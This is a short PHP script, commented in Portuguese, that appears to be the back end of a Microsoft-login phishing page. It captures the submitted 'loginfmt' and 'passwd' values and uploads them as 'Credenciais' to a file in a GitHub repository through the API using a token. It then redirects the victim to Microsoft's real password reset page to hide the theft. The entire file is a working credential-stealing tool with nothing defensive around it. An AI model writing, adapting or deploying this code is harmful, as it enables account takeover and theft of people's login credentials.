<?php
$user = $_POST['loginfmt'];
$pass = $_POST['passwd'];

// Token do GitHub (com permissão de commit)
$token = "SEU_TOKEN_AQUI";
$repo = "usuario/repositorio";
$file = "dados/usernames.txt";
$mensagem = "Credenciais: $user | $pass\n";

// Conteúdo base64 (API do GitHub exige isso)
$data = base64_encode($mensagem);

$payload = json_encode([
    "message" => "Novo registro",
    "content" => $data
]);

$ch = curl_init("https://api.github.com/repos/$repo/contents/$file");
curl_setopt($ch, CURLOPT_USERPWD, "usuario:$token");
curl_setopt($ch, CURLOPT_USERAGENT, "PHP");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Redireciona para a página oficial
header("Location: https://account.live.com/ResetPassword.aspx");
exit();
?>
